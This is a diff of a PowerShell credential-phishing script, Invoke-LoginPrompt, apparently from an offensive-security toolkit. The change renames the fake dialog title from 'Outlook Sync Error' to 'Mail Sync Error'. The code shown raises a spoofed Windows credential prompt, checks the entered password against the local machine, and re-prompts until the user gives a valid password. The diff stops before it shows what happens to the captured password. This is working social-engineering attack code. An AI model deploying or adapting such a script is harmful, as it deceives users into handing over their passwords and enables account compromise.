@@ -2,7 +2,7 @@
 #Twitter: @enigma0x3
 #Blog: www.enigma0x3.wordpress.com
 function Invoke-LoginPrompt{
-$cred = $Host.ui.PromptForCredential("Outlook Sync Error", "Please enter user credentials", "$env:userdomain\$env:username","")
+$cred = $Host.ui.PromptForCredential("Mail Sync Error", "Please enter user credentials", "$env:userdomain\$env:username","")
 $username = "$env:username"
 $domain = "$env:userdomain"
 $full = "$domain" + "\" + "$username"
@@ -10,7 +10,7 @@ $password = $cred.GetNetworkCredential().password
 Add-Type -assemblyname System.DirectoryServices.AccountManagement
 $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 while($DS.ValidateCredentials("$full", "$password") -ne $True){
-    $cred = $Host.ui.PromptForCredential("Outlook Sync Error", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
+    $cred = $Host.ui.PromptForCredential("Mail Sync Error", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
     $username = "$env:username"
     $domain = "$env:userdomain"
     $full = "$domain" + "\" + "$username"
